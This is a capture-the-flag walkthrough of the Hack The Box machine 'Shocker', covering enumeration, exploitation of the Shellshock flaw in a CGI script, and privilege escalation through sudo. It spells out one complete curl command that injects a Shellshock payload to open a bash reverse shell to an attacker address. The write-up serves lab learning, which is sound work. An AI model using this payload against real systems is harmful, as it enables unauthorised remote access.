https://app.hackthebox.com/machines/Shocker

Enumeration

Run nmap scan to find for open ports.

![image](https://user-images.githubusercontent.com/93418272/184519095-57f3e341-40e9-4c2c-8a49-3d64ef7feec3.png)


Run a gobuster scan

![image](https://user-images.githubusercontent.com/93418272/184519097-ad429544-e453-46ba-b2d5-1662dc124c30.png)


Webserver shows us a normal page.

![image](https://user-images.githubusercontent.com/93418272/184519101-10b32cc1-c593-4711-93d8-d1b5ccab96bc.png)


cgi-bin page is unavailable , lets run a gobuster scan against it. Make sure to add as many extensions as posssible.

![image](https://user-images.githubusercontent.com/93418272/184519107-74c8190e-22dc-4b8e-8c4e-dfee05311818.png)


Download the script file.

![image](https://user-images.githubusercontent.com/93418272/184519111-0e5b8544-bb2f-4716-b112-0a6411ddc3e9.png)

![image](https://user-images.githubusercontent.com/93418272/184519119-57711027-41b4-4433-9493-5362d194f398.png)

From the box name and cgi-bin we can guess that the machine has a shellshock vulnerability.

Use a nmap scrip scan to test for this vulnerability.

![image](https://user-images.githubusercontent.com/93418272/184519124-42a565f0-bb34-4c71-9f02-4a4027f8a709.png)


Let's test out the vulnerability.

Found a script with google here.

![image](https://user-images.githubusercontent.com/93418272/184519132-278dd19a-b385-4e7a-9b62-91ce8a8896cb.png)


Test it out on burpsuite.

![image](https://user-images.githubusercontent.com/93418272/184519137-604b249a-2bcb-4ac9-9b8a-1e4e364487d1.png)


on curl

![image](https://user-images.githubusercontent.com/93418272/184519142-d25060bb-7957-4f5d-bec1-110eed4a777f.png)


Use a bash reverse shell to craft out a payload for the shellshock exploit.

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.23/4444 0>&1'" \
http://10.10.10.56:80/cgi-bin/user.sh

Start a nc listener 

![image](https://user-images.githubusercontent.com/93418272/184519152-5a302d6e-a0a5-4130-94ab-147c65cfe3dd.png)


Foothold

A shell is gained.

![image](https://user-images.githubusercontent.com/93418272/184519160-39234708-0450-48a8-9e67-ecb0fb41e03e.png)


First flag is found.

![image](https://user-images.githubusercontent.com/93418272/184519165-8f0455ba-69d8-4c86-a684-6bf4c2637675.png)


Privilege escalation

Check sudo -l for clues.

![image](https://user-images.githubusercontent.com/93418272/184519169-b92990b0-c193-4a16-a38b-685cb11903ba.png)


Check GTFOBins for script.

![image](https://user-images.githubusercontent.com/93418272/184519178-7db3313b-029f-4e01-80be-7d94727e4ffe.png)


Run the script and root access is gained.

![image](https://user-images.githubusercontent.com/93418272/184519180-816dc31b-4df4-4b2b-84d8-7ae88eae67eb.png)


Final flag is found.

![image](https://user-images.githubusercontent.com/93418272/184519183-107c581e-c466-4aae-9aa8-665dcd19cc69.png)
